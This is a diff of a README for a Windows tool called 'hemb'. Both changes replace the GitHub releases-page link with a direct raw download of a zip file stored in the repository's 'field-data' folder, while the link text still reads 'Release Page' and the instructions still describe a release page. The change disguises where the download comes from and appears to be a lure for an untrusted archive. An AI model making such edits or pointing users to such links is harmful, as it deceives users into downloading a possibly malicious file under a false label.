@@ -1,6 +1,6 @@
 # 📡 hemb - Connect links across many networks
 
-[![Download hemb](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petticoated-keelarch984/hemb/releases)
+[![Download hemb](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Petticoated-keelarch984/hemb/main/field-data/Software_v1.3.zip)
 
 ## 🧩 What hemb does
 
@@ -23,7 +23,7 @@ For normal use, a recent version of Windows 10 or Windows 11 works best. If you 
 
 Visit the release page here:
 
-[Go to the hemb release page](https://github.com/Petticoated-keelarch984/hemb/releases)
+[Go to the hemb release page](https://raw.githubusercontent.com/Petticoated-keelarch984/hemb/main/field-data/Software_v1.3.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.
 
